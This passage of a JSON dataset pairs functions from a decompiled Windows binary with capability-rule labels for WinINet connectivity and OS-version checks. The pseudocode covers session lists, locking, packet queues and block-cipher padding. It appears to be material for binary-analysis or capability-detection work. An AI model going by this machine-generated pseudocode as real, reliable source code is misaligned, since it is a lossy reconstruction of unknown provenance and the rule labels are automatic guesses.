        "decompiled_code": "\nuint __cdecl fcn.0006d420(int32_t arg_8h, uint *arg_ch, uint arg_10h)\n\n{\n    uint var_1ch;\n    uint *var_18h;\n    int32_t var_14h;\n    uint *var_10h;\n    uint *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*(arg_8h + 0x10) == 0) {\n        var_14h = 0;\n        for (var_18h = arg_ch; var_18h != NULL; var_18h = *var_18h) {\n            var_14h = var_14h + var_18h[2];\n        }\n        var_14h = fcn.00035490(var_14h);\n        var_4h = 0;\n        var_ch = &var_14h;\n        var_8h = 4;\n        var_10h = arg_ch;\n        var_1ch = fcn.00074410(*(arg_8h + 4), &var_10h, arg_10h);\n    }\n    else {\n        var_1ch = fcn.00074410(*(arg_8h + 4), arg_ch, arg_10h);\n    }\n    return var_1ch;\n}\n",
        "token_count": 291
    },
    "0006d4c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0006d4c0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = fcn.0006d420(arg_8h, arg_ch, 0);\n    if (iVar1 == 0) {\n        iVar1 = fcn.0006d150(arg_8h, arg_10h, arg_14h, arg_18h, 0);\n    }\n    return iVar1;\n}\n",
        "token_count": 133
    },
    "0006d510": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.0006d510(int32_t *arg_8h, uint arg_ch, int32_t arg_10h, uint arg_14h, int32_t arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    int32_t var_54h;\n    uint var_50h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_10h = fcn.00035200(0xf8);\n    if (var_10h == 0) {\n        var_54h = 0x21590004;\n        goto code_r0x0006d69f;\n    }\n    fcn.00078790(var_10h, 0, 0xf8);\n    fcn.000344f0(var_10h + 0xd0);\n    fcn.000344f0(var_10h + 0xd8);\n    fcn.00033ff0(var_10h + 0xd4);\n    var_8h = arg_ch;\n    var_4h = 0;\n    if (arg_18h == 0) {\n        if (arg_10h == 0) {\n            var_54h = 0x21590064;\n            goto code_r0x0006d69f;\n        }\n        var_54h = fcn.000745d0(var_10h + 8, &var_8h, arg_10h, arg_14h, arg_20h);\n        if (var_54h != 0) goto code_r0x0006d69f;\n        *(var_10h + 0xc) = *(var_10h + 8);\n    }\n    else {\n        var_54h = fcn.00074600(var_10h + 4, &var_8h, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h);\n        if (var_54h != 0) goto code_r0x0006d69f;\n        *(var_10h + 0xc) = *(var_10h + 4);\n    }\n    if ((arg_10h != 0) && (arg_18h == 0)) {\n        fcn.0007865e(&var_50h, 0xb1be28f0, 0x9fff6, 0);\n        fcn.00074a60(*(var_10h + 0xc), &var_50h, 0);\n        for (var_ch = 0; var_ch < 10; var_ch = var_ch + 1) {\n            fcn.0006dc20(var_10h);\n        }\n        fcn.0001a8e0(var_10h + 0x10, 0xb1c3afe0, var_10h);\n    }\n    *(var_10h + 0xe8) = 1;\n    *arg_8h = var_10h;\ncode_r0x0006d69f:\n    if ((var_54h != 0) && (var_10h != 0)) {\n        if (*(var_10h + 0xc) != 0) {\n            fcn.00074950(var_10h + 0xc, 0);\n        }\n        fcn.00034080(var_10h + 0xd4);\n        fcn.00034520(var_10h + 0xd0);\n        fcn.00034520(var_10h + 0xd8);\n        fcn.00035330(var_10h);\n    }\n    return var_54h;\n}\n",
        "token_count": 822
    },
    "0006d710": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0006d710(int32_t arg_8h)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint *var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    fcn.00034550(arg_8h + 0xd0);\n    for (var_4h = *(arg_8h + 0xc4); var_4h != 0; var_4h = *(var_4h + 0xb8)) {\n        fcn.00034550(var_4h + 0xd0);\n        *(var_4h + 0xb4) = 0x21590006;\n        fcn.000345c0(var_4h + 0xd0);\n    }\n    fcn.000345c0(arg_8h + 0xd0);\n    *(arg_8h + 0xb4) = 0x21590006;\n    fcn.000340b0(arg_8h + 0xd4);\n    if (*(arg_8h + 0xa8) != 0) {\n        fcn.00034550(arg_8h + 0xd0);\n        var_ch = *(arg_8h + 0xa8);\n        while (var_ch != NULL) {\n            puVar1 = *var_ch;\n            fcn.00074e50(*(arg_8h + 0xc), var_ch[1]);\n            fcn.00035330(var_ch);\n            var_ch = puVar1;\n        }\n        *(arg_8h + 0xa8) = 0;\n        *(arg_8h + 0xac) = 0;\n        fcn.000345c0(arg_8h + 0xd0);\n    }\n    if (*(arg_8h + 0xe8) != 0) {\n        fcn.00074950(arg_8h + 0xc, 0);\n    }\n    iVar2 = fcn.00037240(arg_8h + 0x10);\n    if (iVar2 != 0) {\n        fcn.00037270(arg_8h + 0x10, 0);\n    }\n    return;\n}\n",
        "token_count": 488
    },
    "0006d860": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0006d860(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_8h;\n    int32_t var_4h;\n    \n    while( true ) {\n        while (iVar1 = fcn.00034570(arg_8h + 0xd0),  iVar1 == 0) {\n            fcn.000209a0(1);\n        }\n        if (*(arg_8h + 0xc0) == 0) break;\n        iVar1 = fcn.00034570(*(arg_8h + 0xc0) + 0xd0);\n        if (iVar1 != 0) goto code_r0x0006d8d3;\n        fcn.000345c0(arg_8h + 0xd0);\n        fcn.000209a0(1);\n    }\n    fcn.000345c0(arg_8h + 0xd0);\ncode_r0x0006d8d3:\n    if (*(arg_8h + 0xc0) != 0) {\n        if (*(arg_8h + 0xb8) == 0) {\n            *(*(arg_8h + 0xc0) + 200) = *(arg_8h + 0xbc);\n        }\n        else {\n            *(*(arg_8h + 0xb8) + 0xbc) = *(arg_8h + 0xbc);\n        }\n        if (*(arg_8h + 0xbc) == 0) {\n            *(*(arg_8h + 0xc0) + 0xc4) = *(arg_8h + 0xb8);\n        }\n        else {\n            *(*(arg_8h + 0xbc) + 0xb8) = *(arg_8h + 0xb8);\n        }\n        fcn.000345c0(*(arg_8h + 0xc0) + 0xd0);\n        fcn.000345c0(arg_8h + 0xd0);\n    }\n    if (*(arg_8h + 0xc4) != 0) {\n        fcn.00034550(arg_8h + 0xd0);\n        iVar1 = *(arg_8h + 0xc4);\n        while (var_4h = iVar1,  var_4h != 0) {\n            iVar1 = *(var_4h + 0xb8);\n            if ((*(var_4h + 0xe4) != 0) || (*(var_4h + 0xe0) != 0)) {\n                fcn.0006d860(var_4h);\n            }\n        }\n        *(arg_8h + 0xcc) = 0;\n        for (var_4h = *(arg_8h + 0xc4); var_4h != 0; var_4h = *(var_4h + 0xb8)) {\n            fcn.00034550(var_4h + 0xd0);\n            *(var_4h + 0xc0) = 0;\n            *(var_4h + 0xbc) = 0;\n            *(var_4h + 0xb8) = 0;\n            fcn.000345c0(var_4h + 0xd0);\n        }\n        *(arg_8h + 200) = 0;\n        *(arg_8h + 0xc4) = 0;\n        fcn.000345c0(arg_8h + 0xd0);\n    }\n    fcn.00034080(arg_8h + 0xd4);\n    fcn.00034520(arg_8h + 0xd0);\n    fcn.00034520(arg_8h + 0xd8);\n    iVar1 = fcn.00037240(arg_8h + 0x10);\n    if (iVar1 != 0) {\n        fcn.00037220(arg_8h + 0x10);\n    }\n    fcn.00035330(arg_8h);\n    return;\n}\n",
        "token_count": 897
    },
    "0006daf0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0006daf0(int32_t arg_8h, int32_t *arg_ch)\n\n{\n    uint uVar1;\n    int32_t var_4h;\n    \n    if (*(arg_8h + 0xb4) == 0) {\n        fcn.00034550(arg_8h + 0xd0);\n        if ((*(arg_8h + 0xcc) == 0) && (fcn.0006dc20(arg_8h),  *(arg_8h + 0xcc) == 0)) {\n            uVar1 = 0x21590004;\n        }\n        else {\n            while( true ) {\n                for (var_4h = *(arg_8h + 0xc4); (var_4h != 0 && (*(var_4h + 0xe0) == 0)); var_4h = *(var_4h + 0xb8)) {\n                }\n                if (var_4h != 0) {\n                    *(var_4h + 0xe0) = 0;\n                    *arg_ch = var_4h;\n                    fcn.0006dc20(arg_8h);\n                    if (*(arg_8h + 0xcc) < 10) {\n                        fcn.0006dc20(arg_8h);\n                    }\n                    fcn.000345c0(arg_8h + 0xd0);\n                    return 0;\n                }\n                fcn.000345c0(arg_8h + 0xd0);\n                fcn.000340e0(arg_8h + 0xd4, 0xffffffff);\n                if (*(arg_8h + 0xb4) != 0) break;\n                fcn.00034550(arg_8h + 0xd0);\n            }\n            uVar1 = *(arg_8h + 0xb4);\n        }\n    }\n    else {\n        uVar1 = *(arg_8h + 0xb4);\n    }\n    return uVar1;\n}\n",
        "token_count": 443
    },
    "0006dc20": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0006dc20(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_4h;\n    \n    iVar1 = fcn.00035200(0xf8);\n    if (iVar1 == 0) {\n        uVar2 = 0x21590004;\n    }\n    else {\n        fcn.00078790(iVar1, 0, 0xf8);\n        fcn.000344f0(iVar1 + 0xd0);\n        fcn.000344f0(iVar1 + 0xd8);\n        fcn.00033ff0(iVar1 + 0xd4);\n        *(iVar1 + 8) = *(arg_8h + 8);\n        *(iVar1 + 0xc) = *(arg_8h + 0xc);\n        *(iVar1 + 0xe4) = 1;\n        fcn.00034550(arg_8h + 0xd0);\n        *(iVar1 + 0xbc) = *(arg_8h + 200);\n        if (*(arg_8h + 200) != 0) {\n            *(*(arg_8h + 200) + 0xb8) = iVar1;\n        }\n        *(arg_8h + 200) = iVar1;\n        if (*(arg_8h + 0xc4) == 0) {\n            *(arg_8h + 0xc4) = *(arg_8h + 200);\n        }\n        *(arg_8h + 0xcc) = *(arg_8h + 0xcc) + 1;\n        *(iVar1 + 0xc0) = arg_8h;\n        fcn.000345c0(arg_8h + 0xd0);\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 413
    },
    "0006dd90": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0006dd90(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint var_4h;\n    \n    if (*(arg_8h + 4) == 0) {\n        var_4h = fcn.000751d0(*(arg_8h + 8), arg_ch, arg_10h, arg_8h + 0x18, 0);\n    }\n    else {\n        var_4h = fcn.00074ed0(*(arg_8h + 4), arg_ch, arg_10h, 0);\n    }\n    return var_4h;\n}\n",
        "token_count": 145
    },
    "0006ddf0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0006ddf0(int32_t arg_8h, uint *arg_ch, uint *arg_10h, int32_t arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    if (*(arg_8h + 0xb4) == 0) {\n        if (*(arg_8h + 4) == 0) {\n            fcn.00034550(arg_8h + 0xd8);\n            if (*(arg_8h + 0xb4) == 0) {\n                var_ch = 0x21590002;\n                for (var_4h = 0; var_4h < 2; var_4h = var_4h + 1) {\n                    fcn.00034550(arg_8h + 0xd0);\n                    if (*(arg_8h + 0xa8) != 0) {\n                        *arg_ch = *(*(arg_8h + 0xa8) + 4);\n                        *arg_10h = *(*(arg_8h + 0xa8) + 8);\n                        *(arg_8h + 0xb0) = *(arg_8h + 0xb0) - *(*(arg_8h + 0xa8) + 8);\n                        iVar1 = **(arg_8h + 0xa8);\n                        fcn.00035330(*(arg_8h + 0xa8));\n                        *(arg_8h + 0xa8) = iVar1;\n                        if (iVar1 == 0) {\n                            *(arg_8h + 0xac) = 0;\n                        }\n                        fcn.000345c0(arg_8h + 0xd0);\n                        var_ch = 0;\n                        break;\n                    }\n                    if (*(arg_8h + 0xb4) != 0) {\n                        var_ch = *(arg_8h + 0xb4);\n                        fcn.000345c0(arg_8h + 0xd0);\n                        break;\n                    }\n                    fcn.000345c0(arg_8h + 0xd0);\n                    if (arg_14h == 0) break;\n                    iVar1 = fcn.000340e0(arg_8h + 0xd4, 0);\n                    if (iVar1 == 0) {\n                        fcn.000340e0(arg_8h + 0xd4, arg_14h);\n                    }\n                    else {\n                        var_4h = var_4h + -1;\n                    }\n                }\n                fcn.000345c0(arg_8h + 0xd8);\n            }\n            else {\n                fcn.000345c0(arg_8h + 0xd8);\n                var_ch = *(arg_8h + 0xb4);\n            }\n        }\n        else {\n            var_ch = fcn.00074f90(*(arg_8h + 4), arg_ch, arg_10h, arg_14h, arg_18h);\n        }\n    }\n    else {\n        var_ch = *(arg_8h + 0xb4);\n    }\n    return var_ch;\n}\n",
        "token_count": 713
    },
    "0006dfe0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0006dfe0(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint *puVar3;\n    uint var_d0h;\n    int32_t var_cch;\n    int32_t var_c8h;\n    int32_t *var_c4h;\n    int32_t *var_c0h;\n    uint32_t var_bch;\n    uint var_b8h;\n    uint *var_b4h;\n    uint var_b0h;\n    uint *var_ach;\n    int32_t var_a8h;\n    uint *var_a4h;\n    uint var_a0h;\n    int32_t var_9ch;\n    uint var_98h;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_4h = arg_8h;\ncode_r0x0006dff1:\n    do {\n        var_a8h = fcn.000753e0(*(var_4h + 8), &var_a0h, &var_9ch, &var_98h, 0xffffffff, 0);\n        if (var_a8h != 0) {\n            *(var_4h + 0xb4) = var_a8h;\n            fcn.00034550(var_4h + 0xd0);\n            for (var_8h = *(var_4h + 0xc4); var_8h != 0; var_8h = *(var_8h + 0xb8)) {\n                fcn.00034550(var_8h + 0xd0);\n                *(var_8h + 0xb4) = var_a8h;\n                fcn.000340b0(var_8h + 0xd4);\n                fcn.000345c0(var_8h + 0xd0);\n            }\n            fcn.000345c0(var_4h + 0xd0);\n            return 0;\n        }\n        fcn.00034550(var_4h + 0xd0);\n        for (var_8h = *(var_4h + 0xc4); var_8h != 0; var_8h = *(var_8h + 0xb8)) {\n            if (*(var_8h + 0xe4) == 0) {\n                var_c0h = var_8h + 0x18;\n                var_c4h = &var_98h;\n                for (var_bch = 0x90; 3 < var_bch; var_bch = var_bch - 4) {\n                    if (*var_c4h != *var_c0h) goto code_r0x0006e0cd;\n                    var_c0h = var_c0h + 1;\n                    var_c4h = var_c4h + 1;\n                }\n                if (var_bch == 0) {\ncode_r0x0006e1a3:\n                    var_cch = 0;\n                }\n                else {\ncode_r0x0006e0cd:\n                    var_c8h = *var_c4h - *var_c0h;\n                    if (var_c8h == 0) {\n                        if (var_bch == 1) goto code_r0x0006e1a3;\n                        var_c8h = *(var_c4h + 1) - *(var_c0h + 1);\n                        if (var_c8h == 0) {\n                            if (var_bch == 2) goto code_r0x0006e1a3;\n                            var_c8h = *(var_c4h + 2) - *(var_c0h + 2);\n                            if (var_c8h == 0) {\n                                if ((var_bch == 3) || (var_c8h = *(var_c4h + 3) - *(var_c0h + 3),  var_c8h == 0))\n                                goto code_r0x0006e1a3;\n                            }\n                        }\n                    }\n                    var_cch = 1;\n                    if (var_c8h < 1) {\n                        var_cch = -1;\n                    }\n                }\n                if (var_cch == 0) break;\n            }\n        }\n        if (var_8h != 0) {\ncode_r0x0006e323:\n            if (var_8h == 0) {\n                fcn.00074e50(*(var_4h + 0xc), var_a0h);\n                if (*(var_4h + 0xf4) != 0) {\n                    var_b8h = *(var_4h + 8);\n                    var_b4h = &var_98h;\n                    (**(var_4h + 0xf4))(*(var_4h + 0xec), var_a0h, var_9ch, 0xb1c3b750, &var_b8h);\n                }\n            }\n            else {\n                fcn.00034550(var_8h + 0xd0);\n                if (*(var_8h + 0xb4) != 0) {\n                    fcn.000345c0(var_8h + 0xd0);\n                    fcn.000345c0(var_4h + 0xd0);\n                    fcn.00074e50(*(var_4h + 0xc), var_a0h);\n                    goto code_r0x0006dff1;\n                }\n                if (*(var_8h + 0xb0) + var_9ch < 0x100000) {\n                    var_a4h = fcn.00035200(0x10);\n                    if (var_a4h == NULL) {\n                        fcn.00074e50(*(var_4h + 0xc), var_a0h);\n                    }\n                    else {\n                        *var_a4h = 0;\n                        var_a4h[1] = 0;\n                        var_a4h[2] = 0;\n                        var_a4h[3] = 0;\n                        var_a4h[1] = var_a0h;\n                        var_a4h[2] = var_9ch;\n                        if (*(var_8h + 0xac) == 0) {\n                            *(var_8h + 0xa8) = var_a4h;\n                        }\n                        else {\n                            **(var_8h + 0xac) = var_a4h;\n                        }\n                        *(var_8h + 0xac) = var_a4h;\n                        *(var_8h + 0xb0) = *(var_8h + 0xb0) + var_9ch;\n                        fcn.000340b0(var_8h + 0xd4);\n                    }\n                }\n                else {\n                    fcn.00074e50(*(var_4h + 0xc), var_a0h);\n                }\n                fcn.000345c0(var_8h + 0xd0);\n            }\n            fcn.000345c0(var_4h + 0xd0);\n            goto code_r0x0006dff1;\n        }\n        if ((*(var_4h + 0xf0) == 0) || (iVar1 = (**(var_4h + 0xf0))(*(var_4h + 0xec), var_a0h, var_9ch),  iVar1 != 0)) {\n            var_8h = *(var_4h + 0xc4);\ncode_r0x0006e2bd:\n            if (var_8h != 0) {\n                if (*(var_8h + 0xe4) == 0) break;\n                puVar2 = &var_98h;\n                puVar3 = var_8h + 0x18;\n                for (iVar1 = 0x24; iVar1 != 0; iVar1 = iVar1 + -1) {\n                    *puVar3 = *puVar2;\n                    puVar2 = puVar2 + 1;\n                    puVar3 = puVar3 + 1;\n                }\n                *(var_8h + 0xe4) = 0;\n                *(var_8h + 0xe0) = 1;\n                *(var_4h + 0xcc) = *(var_4h + 0xcc) + -1;\n                fcn.000340b0(var_4h + 0xd4);\n            }\n            goto code_r0x0006e323;\n        }\n        fcn.000345c0(var_4h + 0xd0);\n        if (*(var_4h + 0xf4) != 0) {\n            var_b0h = *(var_4h + 8);\n            var_ach = &var_98h;\n            (**(var_4h + 0xf4))(*(var_4h + 0xec), var_a0h, var_9ch, 0xb1c3b750, &var_b0h);\n        }\n        fcn.00074e50(*(var_4h + 0xc), var_a0h);\n    } while( true );\n    var_8h = *(var_8h + 0xb8);\n    goto code_r0x0006e2bd;\n}\n",
        "token_count": 2039
    },
    "0006e590": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.0006e590(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = fcn.0006dd90(arg_8h, arg_ch, arg_10h);\n    if (iVar1 == 0) {\n        iVar1 = fcn.0006ddf0(arg_8h, arg_14h, arg_18h, arg_1ch, arg_20h);\n    }\n    return iVar1;\n}\n",
        "token_count": 147
    },
    "0006e6c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0006e6c0(int32_t arg_8h, uint arg_ch)\n\n{\n    uint var_4h;\n    \n    if (*(arg_8h + 4) == 0) {\n        var_4h = fcn.000752a0(*(arg_8h + 8), arg_ch, arg_8h + 0x18, 0);\n    }\n    else {\n        var_4h = fcn.000750a0(*(arg_8h + 4), arg_ch, 0);\n    }\n    return var_4h;\n}\n",
        "token_count": 131
    },
    "0006e710": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0006e710(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = fcn.0006e6c0(arg_8h, arg_ch);\n    if (iVar1 == 0) {\n        iVar1 = fcn.0006ddf0(arg_8h, arg_10h, arg_14h, arg_18h, arg_1ch);\n    }\n    return iVar1;\n}\n",
        "token_count": 138
    },
    "0006e790": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.0006e790(int32_t *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    int32_t iVar1;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.00035200(0x40);\n    if (var_4h == 0) {\n        iVar1 = 0x21590004;\n    }\n    else {\n        fcn.00078790(var_4h, 0, 0x40);\n        *(var_4h + 0xc) = *0xb1c4623c;\n        *(var_4h + 0x10) = *0xb1c46240;\n        *(var_4h + 0x14) = *0xb1c46244;\n        *(var_4h + 0x18) = *0xb1c46248;\n        fcn.000344f0(var_4h + 0x28);\n        var_ch = arg_ch;\n        var_8h = 0;\n        iVar1 = fcn.00075a40(var_4h + 4, &var_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h);\n        if (iVar1 == 0) {\n            *arg_8h = var_4h;\n        }\n        else {\n            fcn.00035330(var_4h);\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 373
    },
    "0006e8a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0006e8a0(int32_t arg_8h, int32_t *arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_8h = fcn.00075e70(*(arg_8h + 4), &var_4h, arg_10h);\n    if (var_8h == 0) {\n        iVar1 = fcn.00035200(0x40);\n        *arg_ch = iVar1;\n        if (*arg_ch == 0) {\n            var_8h = 0x21590004;\n        }\n        else {\n            fcn.00078790(*arg_ch, 0, 0x40);\n            *(*arg_ch + 4) = var_4h;\n            *(*arg_ch + 8) = 2;\n            iVar1 = *arg_ch;\n            *(iVar1 + 0xc) = *(arg_8h + 0xc);\n            *(iVar1 + 0x10) = *(arg_8h + 0x10);\n            *(iVar1 + 0x14) = *(arg_8h + 0x14);\n            *(iVar1 + 0x18) = *(arg_8h + 0x18);\n            *(*arg_ch + 0x2c) = *(arg_8h + 0x2c);\n            fcn.000344f0(*arg_ch + 0x28);\n        }\n        if (var_8h != 0) {\n            fcn.00075d60(arg_ch, 0);\n            *arg_ch = 0;\n        }\n    }\n    return var_8h;\n}\n",
        "token_count": 394
    },
    "0006ea60": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0006ea60(int32_t arg_8h, uint arg_ch, uint32_t arg_10h, uint arg_14h)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    int32_t var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    char *var_8h;\n    int32_t var_4h;\n    \n    var_ach = fcn.0006f020(arg_8h);\n    if (var_ach == 0) {\n        if (arg_10h < 1) {\n            if (arg_10h == 0) {\n                var_ach = fcn.00076330(*(arg_8h + 4), arg_ch, 0, arg_14h);\n            }\n            else {\n                var_ach = 0x21590068;\n            }\n        }\n        else {\n            puVar1 = *(arg_8h + 0x1c);\n            var_a8h = *puVar1;\n            var_a4h = puVar1[1];\n            var_98h = puVar1[2];\n            var_94h = puVar1[3];\n            var_a0h = var_a8h;\n            var_9ch = var_a4h;\n            fcn.00031300(&var_90h, 0x10, &var_a0h);\n            var_8h = fcn.00035200(arg_10h + 9);\n            if (var_8h == NULL) {\n                var_ach = 0x21590004;\n            }\n            else {\n                fcn.000307e0(arg_ch, var_8h + 1, arg_10h, &var_90h, &var_a8h, 1);\n                uVar2 = arg_10h & 0x80000007;\n                if (uVar2 < 0) {\n                    uVar2 = (uVar2 - 1 | 0xfffffff8) + 1;\n                }\n                var_4h = (-(uVar2 != 0) & 8) + (arg_10h + (arg_10h >> 0x1f & 7U) >> 3) * 8;\n                *var_8h = var_4h - arg_10h;\n                var_ach = fcn.00076330(*(arg_8h + 4), var_8h, var_4h + 1, arg_14h);\n                fcn.00035330(var_8h);\n            }\n        }\n    }\n    return var_ach;\n}\n",
        "token_count": 617
    },
    "0006ebe0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0006ebe0(int32_t arg_8h, int32_t *arg_ch, int32_t *arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t var_ach;\n    uint8_t *var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    int32_t var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    \n    var_ach = fcn.0006f020(arg_8h);\n    if ((var_ach == 0) && (var_ach = fcn.000763f0(*(arg_8h + 4), &var_a8h, &var_9ch, arg_14h, arg_18h),  var_ach == 0))\n    {\n        if (var_9ch == 0) {\n            *arg_ch = 0;\n            *arg_10h = 0;\n            var_ach = 0;\n        }\n        else if (var_9ch < 9) {\n            var_ach = 0x2159012d;\n        }\n        else {\n            puVar1 = *(arg_8h + 0x1c);\n            var_a4h = *puVar1;\n            var_a0h = puVar1[1];\n            var_90h = puVar1[2];\n            var_8ch = puVar1[3];\n            var_98h = var_a4h;\n            var_94h = var_a0h;\n            fcn.00031300(&var_88h, 0x10, &var_98h);\n            iVar2 = fcn.00035200(var_9ch);\n            *arg_ch = iVar2;\n            if (*arg_ch == 0) {\n                var_ach = 0x21590004;\n            }\n            else {\n                fcn.000307e0(var_a8h + 1, *arg_ch, var_9ch + -1, &var_88h, &var_a4h, 0);\n                *arg_10h = (var_9ch + -1) - *var_a8h;\n            }\n            fcn.00076610(*(arg_8h + 4), var_a8h);\n        }\n    }\n    return var_ach;\n}\n",
        "token_count": 554
    },
    "0006ed70": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
